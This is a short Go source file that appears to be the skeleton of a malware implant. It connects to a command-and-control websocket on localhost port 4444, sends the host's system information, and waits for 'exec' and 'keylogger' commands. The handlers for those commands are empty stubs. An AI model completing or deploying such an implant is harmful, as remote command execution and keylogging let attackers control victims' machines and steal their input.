package main

import (
	"context"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

var wg sync.WaitGroup

type c2 struct {
	con *websocket.Conn
	ctx context.Context
}

func (c *c2) connectToserver() {
	c.ctx = context.Background()
	var err error

	c.con, _, err = websocket.Dial(c.ctx, "ws://localhost:4444/connect", nil)
	if err != nil {
		return
	}

	bot := getSysInfo()
	wsjson.Write(c.ctx, c.con, bot)

	go c.heartbeat()
	wg.Add(1)
	go c.listenToserver()
}

func (c *c2) listenToserver() {

	defer wg.Done()
	var msg MessageFromServer
	for {
		err := wsjson.Read(c.ctx, c.con, &msg)
		if err != nil {
			return
		}

		switch msg.Type {
		case "exec":
		case "keylogger":
		}
	}
}

func (c *c2) heartbeat() {
	ticker := time.Tick(30 * time.Second)
	for range ticker {

	}
}

func main() {
	c := c2{}
	c.connectToserver()
	wg.Wait()
}
